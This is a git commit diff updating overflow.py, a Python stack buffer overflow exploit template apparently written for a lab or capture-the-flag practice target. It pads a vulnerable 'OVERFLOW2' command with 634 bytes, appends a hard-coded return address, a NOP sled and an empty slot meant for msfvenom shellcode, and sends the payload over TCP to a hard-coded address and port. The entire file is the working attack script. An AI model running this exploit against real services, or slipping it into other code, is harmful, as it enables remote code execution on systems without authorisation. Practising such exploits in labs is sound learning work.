a786bf98ea1da1aedda5d63ca08eb5e8ba6fceac
MJWyattCyber <66680297+MJWyattCyber@users.noreply.github.com>
2021-10-11 21:16:06 +0100

    Update overflow.py
    updated to python3 and added encoded.

--- overflow.py
+++ overflow.py
@@ -1,22 +1,26 @@
-#!/usr/bin/python
+#!/usr/bin/env python3
 import sys, socket
 
-overflow = ("") # This is where the output from msfvenom should go
+overflow = (
+"")
+ # This is where the output from msfvenom should go
 
-returnaddress = "\xaf\x11\x50\x62" #CHANGE THIS
-address = '127.0.0.1' #CHANGE THIS
-port = 9999 #CHANGE THIS
-vulncommand = 'TRUN /.:/' # CHANGE THIS, the vulnerable command that was found in the spiking section would go here
+returnaddress = "\xbb\x11\x50\x62" #CHANGE THIS
+address = '10.10.211.46' #CHANGE THIS
+port = 1337 #CHANGE THIS
+vulncommand = "OVERFLOW2 " # CHANGE THIS, the vulnerable command that was found in the spiking section would go here
+shell = "A" * 634
 
-shellcode = "A" * 2003 + returnaddress + "\x90" * 32 + overflow
+
+shellcode = vulncommand + shell + returnaddress + "\x90" * 16 + overflow
 
 try:
-	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-	s.connect((address,port))
+        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        s.connect((address,port))
 
-	s.send((vulncommand + shellcode))
-	s.close()
+        s.send(bytes(shellcode, "latin-1"))
+        s.close()
 
 except:
-	print "Error connecting to server"
-	sys.exit()
+        print("Error connecting to server")
+        sys.exit()
